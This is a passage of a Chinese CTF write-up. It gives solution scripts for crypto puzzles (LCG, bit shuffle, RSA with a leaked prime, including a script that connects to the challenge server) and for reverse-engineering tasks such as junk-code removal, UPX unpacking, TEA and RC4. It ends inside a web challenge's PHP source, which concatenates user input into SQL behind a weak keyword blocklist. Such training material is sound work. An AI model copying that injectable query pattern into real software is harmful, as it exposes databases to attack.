for i in range(5):
    output.append((a*output[-1]+b)%n)
output=output[1:]

print(f"a= {a}")
print(f"b= {b}")
print(f"n= {n}")
print(f"output= {output}")

'''
a= 11038051104293825636737927048840374948495135743638335760736456541812454600121662378092076204470379161674978025513228815908025866168932820712800494463291119
b= 7669890746838367306063750903717536289635103704268883176915983817499328681818362074906536678348292208471988261046991315172336686922433329589115523479572527
n= 13073039563554195658474100864764778501665220885172278038598817437329130269105722121849855186521998655684860370899752976230149284102665148411150394198597983
output= [8900793074909305104110408626261472876858092232592096159515121333472532663498587665921415460200787392395782892609997601479322708210482802754503678741185706, 5712803893851587208586703227979655737133620602166204726335409378093753907147459358219065404372767579458633996218272204822720290400583983784229888900299848, 5961478455432415381325949673762298930129108553751955045221772260008177818890140086961297713968043769129255420406259071456550647662869891605891788026258615, 9601854635607231070364489149740888936316562454669748338498260095110659468319706073278004444907806979731540341266366817049574624940336422976010460298558153, 7193195548766020355744607493305394353849075518067845901769284441732883246800707940547421695211725068982012930611957113063645621384275808650719159037495434]
'''
```

```py
for i in range(5):
    output.append((a*output[-1]+b)%n)
```

注意到这里是线性的伪随机数生成算法，参数已知则输入可逆：

```py
from Crypto.Util.number import long_to_bytes, inverse

a = 11038051104293825636737927048840374948495135743638335760736456541812454600121662378092076204470379161674978025513228815908025866168932820712800494463291119
b = 7669890746838367306063750903717536289635103704268883176915983817499328681818362074906536678348292208471988261046991315172336686922433329589115523479572527
n = 13073039563554195658474100864764778501665220885172278038598817437329130269105722121849855186521998655684860370899752976230149284102665148411150394198597983
output = [
    8900793074909305104110408626261472876858092232592096159515121333472532663498587665921415460200787392395782892609997601479322708210482802754503678741185706,
    5712803893851587208586703227979655737133620602166204726335409378093753907147459358219065404372767579458633996218272204822720290400583983784229888900299848,
    5961478455432415381325949673762298930129108553751955045221772260008177818890140086961297713968043769129255420406259071456550647662869891605891788026258615,
    9601854635607231070364489149740888936316562454669748338498260095110659468319706073278004444907806979731540341266366817049574624940336422976010460298558153,
    7193195548766020355744607493305394353849075518067845901769284441732883246800707940547421695211725068982012930611957113063645621384275808650719159037495434
]

m0 = (output[0] - b) * inverse(a, n) % n

print(long_to_bytes(m0))
```

```txt
flag{w3lc0me_t0_th3_world_of_r@nd0m_numb3r5!}
```

### Bitwise_shuffle

```py
from Crypto.Util.number import *
from random import *
flag = b'flag{...}'
m = bytes_to_long(flag)   
assert m.bit_length() == 279
#去看看运算顺序 , 我提醒过你了哦
def reorder_280(n: int) -> int:
    MASK = (1 << 70) - 1  
    return (MASK & ~n >> 70) << 210 | (MASK ^ n & MASK) << 70 | (MASK & n >> 210) << 140 | n >> 140 & MASK

key = getrandbits(280)
add =  ...
mask =  ... #nothing
hint = key ^ mask + add

print('add = ' , add)
print('mask = ' , mask)
print('hint = ' , hint)

c = reorder_280(key ^ m * 2)
print('c = ' , c)

'''
add =  623891754768264982074990776350111439751848797986979475190050881280504431
mask =  119168826420107867655204158289538650529930738740292127546479178481229984377
hint =  405249600549475246336440017829026242299076021264488127281336714447289062387521696099
c =  1551930951702112403311280008876925661361066974605463501990112296888076500634344458692
'''
```

由于 python 中 `+` 的优先级高于 `^`，`hint = key ^ mask + add` 相当于 `hint = key ^ (mask + add)`。

因此 key 可以被恢复。

随后进行 280 位整数分块重排，利用 key 逆向变换即可：

```py
from Crypto.Util.number import long_to_bytes

add = 623891754768264982074990776350111439751848797986979475190050881280504431
mask = 119168826420107867655204158289538650529930738740292127546479178481229984377
hint = 405249600549475246336440017829026242299076021264488127281336714447289062387521696099
c = 1551930951702112403311280008876925661361066974605463501990112296888076500634344458692

S = mask + add
key = hint ^ S
print(f"key = {key}")
print(f"key.bit_length() = {key.bit_length()}")

MASK = (1 << 70) - 1

def reorder_280_inv(out):
    # 从输出中提取四个 70 位块
    B2 = out & MASK                      # 原块2
    B0_inv = (out >> 70) & MASK          # ~原块0
    B0 = (~B0_inv) & MASK                # 原块0
    B3 = (out >> 140) & MASK             # 原块3
    B1_inv = (out >> 210) & MASK         # ~原块1
    B1 = (~B1_inv) & MASK                # 原块1
    n = (B3 << 210) | (B2 << 140) | (B1 << 70) | B0
    return n

x = reorder_280_inv(c)   # x = key ^ (m * 2)
print(f"x = {x}")
print(f"x.bit_length() = {x.bit_length()}")

m2 = x ^ key
m = m2 // 2

flag = long_to_bytes(m)
print(f"flag = {flag.decode()}")
```

```txt
key = 405249600431459772130362450985701804137946130860109529593754487489356747440849606027
key.bit_length() = 278
x = 1895235946431743322006008474654934874342284500260946408674312261369139867467967806321
x.bit_length() = 280
flag = flag{b1n@ry_15_ba51c_@nd_1mp0r7@n7}
```

### RSA_1

```py
from Crypto.Util.number import *
from secret import flag

E = 65537

FLAG1 = flag[:18]
FLAG2 = flag[18:]


def generate_prime_for_e(bits):
    while True:
        p = getPrime(bits)
        if GCD(E, p - 1) == 1:
            return p


def stage1():
    p1, q1 = generate_prime_for_e(512), generate_prime_for_e(512)

    n1 = p1 * q1
    m1 = bytes_to_long(FLAG1)
    c1 = pow(m1, E, n1)

    print(f"n1 = {n1}")
    print(f"c1 = {c1}")
    print(f"p1 = {p1}")
    print()


def stage2():
    p2, q2, r2 = (generate_prime_for_e(512) for _ in range(3))

    n2 = p2 * q2 * r2
    m2 = bytes_to_long(FLAG2)
    c2 = pow(m2, E, n2)

    print(f"n2 = {n2}")
    print(f"c2 = {c2}")
    print(f"p2 = {p2}")
    print()


print("Select stage:")
print("1. Generate Stage 1")
print("2. Generate Stage 2")
print("3. Exit")

choice = input("> ").strip()

while True:
    if choice == "3":
        print("Exiting...")
        break
    elif choice not in ["1", "2"]:
        print("Invalid choice. Please select 1, 2, or 3.")
        choice = input("> ").strip()
        continue

    if choice == "1":
        stage1()
    elif choice == "2":
        stage2()

    print("Select stage:")
    print("1. Generate Stage 1")
    print("2. Generate Stage 2")
    print("3. Exit")
    choice = input("> ").strip()
```

这是一个交互式的题目，在题目中泄露了 RSA 加密过程中重要的参数 p1 和 p2，这将导致我们可以绕过大数分解的难题而将密文解密。

```py
from pwn import remote
import re
from Crypto.Util.number import long_to_bytes, inverse

E = 65537

HOST = "110.42.112.160"
PORT = 48809

def dec_mod_p(c, p):
    d = inverse(E, p - 1)
    return pow(c % p, d, p)


def crt(remainders, moduli):
    M = 1
    for m in moduli:
        M *= m
    x = 0
    for r, m in zip(remainders, moduli):
        Mi = M // m
        x = (x + r * Mi * inverse(Mi, m)) % M
    return x


io = remote(HOST, PORT)

io.recvuntil(b'> ')
io.sendline(b'1')
data1 = io.recvuntil(b'> ').decode()

n1 = int(re.search(r'n1 = (\d+)', data1).group(1))
c1 = int(re.search(r'c1 = (\d+)', data1).group(1))
p1 = int(re.search(r'p1 = (\d+)', data1).group(1))

m1 = dec_mod_p(c1, p1)
flag1 = long_to_bytes(m1)
print("FLAG1:", flag1)

rems = []
mods = []

for _ in range(2):
    io.sendline(b'2')
    data2 = io.recvuntil(b'> ').decode()

    n2 = int(re.search(r'n2 = (\d+)', data2).group(1))
    c2 = int(re.search(r'c2 = (\d+)', data2).group(1))
    p2 = int(re.search(r'p2 = (\d+)', data2).group(1))

    m_mod_p = dec_mod_p(c2, p2)
    rems.append(m_mod_p)
    mods.append(p2)

m2 = crt(rems, mods)
flag2 = long_to_bytes(m2)
print("FLAG2:", flag2)

print("FULL FLAG:", flag1 + flag2)

io.sendline(b'3')
io.close()
```

输出如下：

```bash
❯ python run.py
[+] Opening connection to 110.42.112.160 on port 48809: Done
FLAG1: b'flag{rsa_beginner_'
FLAG2: b'Ci@l1o!}'
FULL FLAG: b'flag{rsa_beginner_Ci@l1o!}'
[*] Closed connection to 110.42.112.160 port 48809
```

```txt
flag{rsa_beginner_Ci@l1o!}
```

## Week 2

---

## Reverse

### 不可逆算法

检查一下 main 函数：

![](https://img.halfcity.top/2026/11/10/5a5d2e8dc9f13c59b3fd4035f2c0aa8e.png)

![](https://img.halfcity.top/2026/11/10/868b28543ddb38f87de411f2f94df924.png)

`sub_140001F00()` 这个函数给出的伪代码是 `return 0` 很奇怪。

直接看汇编可以发现这个似乎是一个巨大的控制流执行函数，其中控制 selector 似乎是 rcx 的低位字节。

第一眼想到的肯定是控制流平坦化，但是细想会发现不对，因为 OLLVM 出来的控制流不会拆地这么规律。

这里可以划分出 256 条控制流，这里太复杂了，我们先看看后面对 flag 密文处理的逻辑是什么。

![](https://img.halfcity.top/2026/11/10/21b41b5ca7d22bfd3426999505274fde.png)

![](https://img.halfcity.top/2026/11/10/dc9902d229a96ca7db12c0a6424b7e50.png)

`sub_140001728()` 似乎是一个计算输入 SHA256 值的函数，`findcrypt` 也可以看到 SHA256 的常量表：

![](https://img.halfcity.top/2026/11/10/97a0ac1d765097917f2047bbd52dfae5.png)

可以 dump 出来校验的 hash 是 `9339B7C4946044719C7AA4DEA1477900C4F0755E850EDFBDFF75BC52342AF9E0`。

这就让人十分懵逼了，给我干哪来了？就给个 hash 难道要我爆破？

flag 中间部分的长度有 24 个字节，显然爆破是不切实际的，回忆一下前面那个巨大的控制流函数，结合这句话 `CFG receipt rendered above`。

虽然暂时不知道它有什么用，但是这应该是解题的关键了。

![](https://img.halfcity.top/2026/11/10/24a28a9ea8a1bdbea41240a63e19a271.png)

这里 IDA 限制了 graph 的节点数量，不过我们还是想看看 graph 长什么样子：

![](https://img.halfcity.top/2026/11/10/02aca0ded27bee494184afcf6cf59021.png)

这里调大最大节点数然后查看 graph ，好像没什么特殊的，拉远看看整体：

![](https://img.halfcity.top/2026/11/10/87c9be2b41c5b76ee161135d3103873f.png)

```txt
flag{cfg_reveals_hash_value_1}
```

### 提瓦特委托局·二：前面的区域，以后再来吧

来到 main 函数：

![](https://img.halfcity.top/2026/11/10/8f5c60d26f65a7beceac6f8355d6da40.png)

`sub_1400017A1()` 负责获取输入并提取 flag 的中间部分，`sub_140001B46` 应该是加密比对的逻辑。

进去一看发现提示 `JUMPOUT`，无法分析。

出现这种情况一般只有三种情况，第一种是程序 dump 不完整，第二种是加壳了，第三种就是加花了。

我们去检查一下汇编：

![](https://img.halfcity.top/2026/11/10/1a4f9275fabe3d3694391da95966c654.png)

很显然这里是加花了。

`jx jnx` 这种类型是典型的花指令，跳转到指令中间来破坏 IDA 递归下降的分析算法。

这里直接 nop 掉即可，它除了混淆毫无意义。

![](https://img.halfcity.top/2026/11/10/a0122d89072ab3d4a3a4fdb7d5503022.png)

直接看伪代码发现还有加花的部分，我们继续往下看：

![](https://img.halfcity.top/2026/11/10/7be5181e3934a398ea132996cc735152.png)

`xor eax, eax` 这条指令值得注意，很多的花指令就是以这条指令开头的，同时我们也注意到从此开始，下面出现了无法分析的部分。

分析一下就可以发现这里的指令毫无意义，异或然后 jp 就相当于 jmp。

`loc_140001BAE` 就是程序接下来的逻辑，但是 IDA 并没有看出来。

那话不多说，直接 nop 掉：

![](https://img.halfcity.top/2026/11/10/41a2ff5b8cab76e38ad142049d248f6c.png)

得到程序的伪代码：

![](https://img.halfcity.top/2026/11/10/30414c103527f86c3291e6f2078549cb.png)

但是这里发现 `sub_140001892`  还有地方加花了，还是 `jx jnx` 的类型：

![](https://img.halfcity.top/2026/11/10/98dd71de82e06de59df7fd7175d14137.png)

故技重施：

![](https://img.halfcity.top/2026/11/10/a7b5e6be0aafc9bed72af459a29f2226.png)

```c
void __fastcall sub_140001892(_BYTE *a1)
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 7; ++i )
  {
    a1[2 * i] = byte_140014060[i] ^ 0x36;
    a1[2 * i + 1] = byte_140014068[i] ^ 0x36;
  }
}
```

改一下类型，这里可以看到真实的逻辑就很简单了，一个双密钥异或处理产生初始密钥。

随后传入 `sub_14000191B`，进行 RC4 加密。

将数据 dump 出来然后解密即可：

```py
byte_140014060 = bytes([0x70, 0x34, 0x69, 0x6D, 0x30, 0x6E, 0x21, 0x21])
byte_140014068 = bytes([0x72, 0x30, 0x61, 0x64, 0x62, 0x6C, 0x30, 0x6B])

perm = [
    0x05, 0x0C, 0x13, 0x02, 0x09, 0x10, 0x17, 0x06,
    0x0D, 0x14, 0x03, 0x0A, 0x11, 0x00, 0x07, 0x0E,
    0x15, 0x04, 0x0B, 0x12, 0x01, 0x08, 0x0F, 0x16
]

Buf2_ = bytes([
    0xE4, 0x59, 0xF5, 0x39, 0x61, 0xD6, 0x5C, 0xCB,
    0xD4, 0x95, 0xFA, 0xAB, 0x23, 0xB5, 0x3E, 0x31,
    0x7D, 0x18, 0x66, 0xA7, 0xDE, 0xB8, 0x26, 0xD6
])

def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    # KSA
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # PRGA
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k)
    return bytes(result)

def make_key() -> bytes:
    key = bytearray(16)
    for i in range(8):
        key[2 * i]     = byte_140014060[i] ^ 0x36
        key[2 * i + 1] = byte_140014068[i] ^ 0x36
    return bytes(key)

def decrypt():
    key = make_key()
    print(f"[*] RC4 Key (hex) : {key.hex()}")
    print(f"[*] RC4 Key (ascii): {key}")

    intermediate = rc4(Buf2_, key)
    print(f"[*] Intermediate (after RC4 decrypt): {intermediate.hex()}")
    print(f"[*] Intermediate (ascii)            : {intermediate}")

    original = bytearray(24)
    for i in range(24):
        original[perm[i]] = intermediate[i]

    print(f"\n[+] 原始输入 (hex)  : {original.hex()}")
    print(f"[+] 原始输入 (ascii): {original.decode('latin1')}")
    print(f"[+] 原始输入 (bytes): {bytes(original)}")

if __name__ == "__main__":
    decrypt()
```

输出如下：

```txt
[*] RC4 Key (hex) : 464402065f575b520654585a1706175d
[*] RC4 Key (ascii): b'FD\x02\x06_W[R\x06TXZ\x17\x06\x17]'
[*] Intermediate (after RC4 decrypt): 6c6461347965215f5f6c766f5f7462746c336e7772656821
[*] Intermediate (ascii)            : b'lda4ye!__lvo_tbtl3nwreh!'

[+] 原始输入 (hex)  : 74723476336c5f6265796f6e645f7468655f77616c6c2121
[+] 原始输入 (ascii): tr4v3l_beyond_the_wall!!
[+] 原始输入 (bytes): b'tr4v3l_beyond_the_wall!!'
```

```
flag{tr4v3l_beyond_the_wall!!}
```

### 阿萨拉下班指南·二：被篡改的标签

检查一下程序发现加壳了，并且无法直接使用 upx 脱壳。

![](https://img.halfcity.top/2026/11/10/c4826d3cfd6fa4b69bc6ff120d52782c.png)

观察发现程序的段名被魔改了，这将导致 upx 无法识别程序并脱壳。

还是一样我们先尝试简单修复一下，如果还是不行就直接手脱，因为 upx 自动脱壳的出来的程序效果还是比手脱好一点点的。

![](https://img.halfcity.top/2026/11/10/2c0027a31ae01902d656e3045ecf45ee.png)

尝试脱壳：

```bat
> upx -d D:\data\workspace\download\asara_escape_2.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2023
UPX 4.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Aug 8th 2023

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     32768 <-      9216   28.13%    win64/pe     asara_escape_2.exe

Unpacked 1 file.
```

很好直接成功了，那么我们可以直接进入下一个环节了。

想想逻辑，这个系列的下一个程序应该就是手脱 UPX？

![](https://img.halfcity.top/2026/11/10/9a200287457065582a3a1a9f6b8cff16.png)

观察到这里也是 MSVC 编译的，依旧是熟悉的 mainCRTStartup()，快速定位到 main() 并整理一下：

![](https://img.halfcity.top/2026/11/10/e85ce4b6a875bc758073749771f2a9ca.png)

加密的逻辑都在 sub_14000167B() 里面了，简单修复一下发现是 tea 加密加上字节互换：

![](https://img.halfcity.top/2026/11/10/5695794229704a8e341fb08be0ed989b.png)

解密脚本如下：

```py
import struct

def tea_decrypt(v0, v1, key):
    sum_ = 0xC6EF3720
    delta = 0x9E3779B9
    for _ in range(32):
        v1 = (v1 - (((key[3] + (v0 >> 5)) ^ (key[2] + (v0 << 4)) ^ (sum_ + v0)))) & 0xFFFFFFFF
        v0 = (v0 - (((sum_ + v1) ^ (key[1] + (v1 >> 5)) ^ (key[0] + (v1 << 4))))) & 0xFFFFFFFF
        sum_ = (sum_ - delta) & 0xFFFFFFFF
    return v0, v1

key = [0x02468ACE, 0x064A8EC2, 0x389EF3ED, 0xBAA9BE8A]

cipher = bytes([
    0x65, 0x7A, 0x95, 0x7F, 0x8D, 0xD2, 0x80, 0x40,
    0x0F, 0x85, 0x7F, 0x85, 0x78, 0x5C, 0x11, 0x82,
    0x05, 0xA6, 0x6B, 0x79, 0xB1, 0xC7, 0xBA, 0x9A
])

plain = bytearray()
for i in range(0, 24, 8):
    v0, v1 = struct.unpack('<II', cipher[i:i+8])
    d0, d1 = tea_decrypt(v0, v1, key)
    plain += struct.pack('<II', d0, d1)

swapped = bytearray(24)
for i in range(0, 24, 2):
    swapped[i]   = plain[i+1]
    swapped[i+1] = plain[i]

print("decrypted:", swapped.decode())
print("flag:     ", f"flag{{{swapped.decode()}}}")
```

输出如下：

```txt
decrypted: asara_tea_little_endian0
flag:      flag{asara_tea_little_endian0}
```

```txt
flag{asara_tea_little_endian0}
```

### 曼波维修部·二：你还没上班，它已经下班了

主逻辑似乎很简单，这里是加密函数：

![](https://img.halfcity.top/2026/11/10/afcfafde5bca7f2402a0fa77372a9bef.png)

但这里调用了没有初始化的 `byte_4018` 和 `n57`，可能他们在 main 之前就被初始化了。

![](https://img.halfcity.top/2026/11/10/7398f2d30a9898462e8c6aad154d681c.png)

可以去 `.init_array` 和 `.finl_array` 看看。

![](https://img.halfcity.top/2026/11/10/c1b34c38e08d8d05672ff7023406fe9f.png)

![](https://img.halfcity.top/2026/11/10/c098cba06495ad854c05d9d36ee83d50.png)

注意到 `sub_1345()` 这个函数似乎使用 ptrace 来初始化了这两个参数。

得到密钥解密就很简单了。

解密脚本如下：

```py
key = bytes([0x23, 0x51, 0x19, 0xa7, 0x6d, 0x04, 0xc2, 0x88])

s2_ = bytes([
    0xCB, 0x81, 0x77, 0x7B, 0x0C, 0x6B, 0x31, 0x61,
    0xEE, 0x09, 0x2C, 0x6F, 0x8B, 0x08, 0x7D, 0xA2,
    0x87, 0xBD, 0x69, 0x91, 0xEE, 0x98, 0xDB, 0x24
])

def ror3(x: int) -> int:
    return ((x >> 3) | (x << 5)) & 0xff

def decrypt(target: bytes) -> bytes:
    v3 = 57
    result = bytearray(24)
    for i in range(24):
        v4 = ror3(target[i])
        temp = (v4 - v3) & 0xff
        result[i] = key[i % 8] ^ temp
        v3 = target[i]
    return bytes(result)

pt = decrypt(s2_)
print(pt)
print(pt.decode())
```

输出如下：

```txt
> python decrypt.py
b'c4t_keys_before_main!!!!'
c4t_keys_before_main!!!!
```

```txt
flag{c4t_keys_before_main!!!!}
```

### 只是一只小蛇

观察程序图标看得出来这是 pyinstaller 打包的程序。

这里不废话直接解包：

```txt
> pyinstxtractor-ng challenge.exe
[+] Processing challenge.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.12
[+] Length of package: 5105361 bytes
[+] Found 54 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: challenge.pyc
[+] Found 92 files in PYZ archive
[+] Successfully extracted pyinstaller archive: challenge.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

`challenge.pyc` 是程序的入口，来到[这里](https://pylingual.io/)反编译 pyc 文件，很好用。

![](https://img.halfcity.top/2026/11/10/5380eb358e60e357c6cba3b4784b9659.png)

得到题目：

```py
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'challenge.py'
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import base64
CUSTOM = 'QWERTYUIOPASDFGHJKLZXCVBNMabcdefghijklmnopqrstuvwxyz9876543210+/'
TARGET = 'c6dsfE1hUxXMBm0oGLNmDJFCJn1sPjdv'
KEY = b'm4nb0key'
INITIAL = 109
def chain(data):
    out = bytearray()
    prev = INITIAL
    for i, value in enumerate(data):
        value ^= KEY[i % len(KEY)] ^ prev
        out.append(value)
        prev = value
    return bytes(out)
def encode(data):
    normal = base64.b64encode(data).decode()
    return normal.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', CUSTOM))
def check(text):
    return len(text) == 30 and text.startswith('flag{') and text.endswith('}') and (encode(chain(text[5:(-1)].encode())) == TARGET)
def main():
    text = input('Shift handoff passphrase: ').strip()
    print('Handoff accepted. Source incident filed separately.' if check(text) else 'It still runs, so the cat says nothing is missing.')
if __name__ == '__main__':
    main()
```

先使用链式异或加密随后使用换表 Base64 编码。

解密脚本如下：

```py
import base64

CUSTOM = 'QWERTYUIOPASDFGHJKLZXCVBNMabcdefghijklmnopqrstuvwxyz9876543210+/'
TARGET = 'c6dsfE1hUxXMBm0oGLNmDJFCJn1sPjdv'
KEY = b'm4nb0key'
INITIAL = 109

# Base64 映射
std = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
normal_b64 = TARGET.translate(str.maketrans(CUSTOM, std))
print("standard b64:", normal_b64)

chained = base64.b64decode(normal_b64)
print("chained bytes:", chained.hex(), chained)

# 反向链式 XOR
prev = INITIAL
plain = bytearray()
for i, value in enumerate(chained):
    orig = value ^ KEY[i % len(KEY)] ^ prev
    plain.append(orig)
    prev = value

print("inner:", plain.decode())
print("flag: ", f"flag{{{plain.decode()}}}")
```

输出如下：

```txt
> python decrypt.py
standard b64: c3dsfC8hGxUZXm9oOSYmMQNVQn8sJjdv
chained bytes: 73776c7c2f211b15195e6f68392626310355427f2c26376f b'swl|/!\x1b\x15\x19^oh9&&1\x03UB\x7f,&7o'
inner: s0urce_was_eaten_by_cat!
flag:  flag{s0urce_was_eaten_by_cat!}
```

```txt
flag{s0urce_was_eaten_by_cat!}
```

### 银河售后中心·二：黑塔女士，别转了

题目给了一个 apk 文件，我们使用 JEB 加载一下：

```java
package org.galactic.aftercare.herta;

import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public final class MainActivity extends AppCompatActivity {
    private boolean accepted;
    private TextView statusText;
    private boolean submitted;
    private EditText tokenInput;

    // 检测为 Lambda 实现
    private void lambda$onCreate$0(View view0) [...]

    // 检测为 Lambda 实现
    private boolean lambda$onCreate$1(TextView textView0, int v, KeyEvent keyEvent0) [...]

    @Override  // androidx.fragment.app.FragmentActivity
    protected void onCreate(Bundle bundle0) {
        super.onCreate(bundle0);
        this.setContentView(layout.activity_main);
        this.tokenInput = (EditText)this.findViewById(id.token_input);
        this.statusText = (TextView)this.findViewById(id.status_text);
        ((Button)this.findViewById(id.open_button)).setOnClickListener((View view0) -> this.submitToken());
        this.tokenInput.setOnEditorActionListener((TextView textView0, int v, KeyEvent keyEvent0) -> {
            if(v != 6) {
                return false;
            }

            this.submitToken();
            return true;
        });
        if(bundle0 != null) {
            this.submitted = bundle0.getBoolean("submitted", false);
            this.accepted = bundle0.getBoolean("accepted", false);
            if(this.submitted) {
                this.showResult();
            }
        }
    }

    @Override  // androidx.activity.ComponentActivity
    protected void onSaveInstanceState(Bundle bundle0) {
        bundle0.putBoolean("submitted", this.submitted);
        bundle0.putBoolean("accepted", this.accepted);
        super.onSaveInstanceState(bundle0);
    }

    private void showResult() {
        this.statusText.setText((this.accepted ? string.accepted : string.rejected));
        this.statusText.setTextColor(this.getColor((this.accepted ? color.success : color.error)));
    }

    private void submitToken() {
        this.accepted = TicketVerifier.check(this.tokenInput.getText().toString());
        this.submitted = true;
        this.showResult();
    }
}
```

这里调用了一个工具类 `TicketVerifier`。

我们进去看下：

```java
package org.galactic.aftercare.herta;

import java.nio.charset.StandardCharsets;

public final class TicketVerifier {
    private static final int[] ORDER;

    static {
        TicketVerifier.ORDER = new int[]{7, 12, 17, 22, 3, 8, 13, 18, 23, 4, 9, 14, 19, 0, 5, 10, 15, 20, 1, 6, 11, 16, 21, 2};
    }

    public static boolean check(String s) {
        if(s != null && s.length() == 30 && s.startsWith("flag{") && s.endsWith("}")) {
            String s1 = s.substring(5, 29);
            int v1 = 0;
            while(v1 < 24) {
                int v2 = s1.charAt(v1);
                if(v2 >= 33 && v2 <= 0x7E) {
                    ++v1;
                    continue;
                }

                return false;
            }

            byte[] arr_b = s1.getBytes(StandardCharsets.US_ASCII);
            byte[] arr_b1 = new byte[24];
            for(int v = 0; v < 24; ++v) {
                arr_b1[v] = arr_b[TicketVerifier.ORDER[v]];
            }

            return NativeDesk.verifyTicket(arr_b1);
        }

        return false;
    }
}
```

这里加载了一个 NativeDesk 的 native 库 并调用了里面的 verifyTicket 方法。

我们将 `libmaintenance.so` 导出分析一下，这里最好导出 ARM 架构的 so，因为 IDA 似乎没有内置对 x64 架构 so 类型的定义。

打开 IDA 发现 `JNIEnv* env` 似乎没有被正确解析，我们手动修复一下一些变量的类型和名称：

![](https://img.halfcity.top/2026/11/10/0a4048e4cf59339aec14e273307a329d.png)

```c
unsigned __int8 __fastcall sub_7FC(unsigned __int8 a1, char n2)
{
  return ((int)a1 >> n2) | (a1 << (8 - n2));
}
```

但这里在解密的时候遇到了问题，参考程序加密的逻辑：

```txt
ROL8(((v8[i]^key[i&7]) + 3*i) & 0xFF, 2) == T[i]
```

最后确实可以得到一个正确的解，可以这个解有很多非明文字节，实际上是无法通过 Java 层校验并传入 native 层的。

这里几乎遇到了死胡同，因为反复检查程序都没再看到任何可疑的地方了，两边的逻辑都很清晰。

所以这里要大胆假设一下，首先满足 Java 层的逻辑是首要的，所以 native 层的校验逻辑可能有问题？

我们可以尝试一下给几个参数的位置改一下，穷举可能用的公式变体，最后发现确实如此：

```txt
(ROL8(v8[i]^key[i&7], 2) + 3*i) & 0xFF == T[i]
```

这才是真实的生成器的公式。

解密脚本如下：

```py
key = b"H3rTaKey"
target = bytes.fromhex("0E990CD75197D4DAE7AF252926EFB8AFF94E8602CB440407")

rol8 = lambda x, n: ((x << n) | (x >> (8 - n))) & 0xFF

b = bytes(rol8((target[i] - 3 * i) & 0xFF, 2) ^ key[i & 7] for i in range(24))
print(f"b: {b}")

ORDER = [7,12,17,22,3,8,13,18,23,4,9,14,19,0,5,10,15,20,1,6,11,16,21,2]
inner = bytearray(24)
for v in range(24):
    inner[ORDER[v]] = b[v]

print("flag{" + inner.decode() + "}")
```

输出如下：

```txt
> python version_2.py
b: b'pijotinnwantih_so_3s__nr'
flag{h3rta_spins_into_jni_now}
```

```txt
flag{h3rta_spins_into_jni_now}
```

## Web

### FLAG 怪盗团·二

题目给了源码：

```php
<?php

declare(strict_types=1);

$dsn = sprintf('mysql:host=%s;dbname=%s;charset=utf8mb4', getenv('DB_HOST') ?: 'db', getenv('DB_NAME') ?: 'chichibu_shop');
$pdo = new PDO($dsn, getenv('DB_USER') ?: 'ctf', getenv('DB_PASSWORD') ?: 'ctf_password');
$keyword = $_GET['q'] ?? '';

foreach (['select', 'union', 'from', 'or', 'and', '--'] as $blocked) {
    $keyword = str_ireplace($blocked, '', $keyword);
}

$sql = "SELECT name, description, price, image FROM products WHERE name LIKE '%{$keyword}%'";
$products = [];
$error = '';
try {
    $products = $pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $exception) {
    $error = '检索失败，请调整关键词。';
}
?>
<!doctype html>
<html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>DrinkDrankDrunk 酒铺</title>
  <style>
    :root {
      font-family: "Helvetica Neue", Arial, sans-serif;
      color: #111;
      background: #fdfdfd;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
    }

    header {
      padding: 22px 4vw;
      border-bottom: 2px solid #111;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 20px;
      background: #fff;
    }

    header a {
      color: #111;
      text-decoration: none;
      font-weight: 800;
      letter-spacing: .12em;
      transition: opacity 0.2s;
    }

    header a:hover {
      opacity: 0.7;
    }

    .bag {
      border: 2px solid #111;
      padding: 8px 16px;
      font-size: 13px;
      font-weight: bold;
      background: #fff;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .bag:hover {
      background: #111;
      color: #fff;
    }

    main {
      width: min(1180px, calc(100% - 32px));
      margin: 0 auto;
      padding: 54px 0 80px;
    }

    .eyebrow {
      font-size: 11px;
      font-weight: 700;
      letter-spacing: .2em;
      color: #555;
    }

    h1 {
      font-size: clamp(36px, 7vw, 72px);
      line-height: 1;
      margin: 20px 0;
      letter-spacing: -.05em;
      font-weight: 800;
    }

    .intro {
      max-width: 520px;
      line-height: 1.6;
      font-size: 18px;
      color: #333;
    }

    .age-warning {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      margin-top: 12px;
      padding: 8px 14px;
      background: #fdf2f2;
      border: 1.5px solid #e02424;
      border-radius: 4px;
      color: #9b1c1c;
      font-size: 13px;
      font-weight: bold;
      letter-spacing: 0.02em;
    }

    .rule {
      width: 100%;
      height: 2px;
      background: #111;
      margin: 40px 0 30px;
    }

    form {
      display: flex;
      gap: 0;
      margin: 0 0 40px;
      box-shadow: 4px 4px 0px rgba(0,0,0,1);
      transition: transform 0.1s;
    }

    form:focus-within {
      transform: translate(2px, 2px);
      box-shadow: 2px 2px 0px rgba(0,0,0,1);
    }

    input {
      flex: 1;
      min-width: 0;
      padding: 16px 20px;
      border: 2px solid #111;
      color: #111;
      background: #fff;
      font: inherit;
      font-size: 16px;
      outline: none;
    }

    button {
      padding: 0 32px;
